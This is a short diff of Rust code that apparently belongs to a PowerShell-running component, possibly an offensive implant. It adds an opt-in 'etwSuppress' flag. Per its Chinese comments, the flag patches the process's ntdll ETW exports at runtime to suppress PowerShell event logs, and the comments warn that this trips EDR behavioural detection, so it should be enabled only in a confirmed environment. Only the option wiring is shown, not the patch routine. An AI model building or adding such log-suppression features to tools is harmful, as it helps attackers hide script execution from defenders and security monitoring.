@@ -38,8 +38,12 @@ fn dispatch(input: &str) -> String {
         .and_then(|t| t.as_u64())
         .unwrap_or(60)
         .max(1);
+    // ETW 痕迹抑制（默认关闭）：显式 etwSuppress=true 时在执行窗口内
+    // 瞬态 patch 本进程 ntdll ETW 导出，抑制 PowerShell 事件日志。
+    // 注意：patch 系统 DLL 是 EDR 行为检测高危信号，仅在确认环境后开启。
+    let suppress_etw = v.get("etwSuppress").and_then(|b| b.as_bool()).unwrap_or(false);
 
-    power_shell::PowerShellRunner::execute(script, timeout)
+    power_shell::PowerShellRunner::execute_opts(script, timeout, suppress_etw)
 }
 
 fn write_output(s: &str, output: *mut u8, output_cap: usize) -> usize {
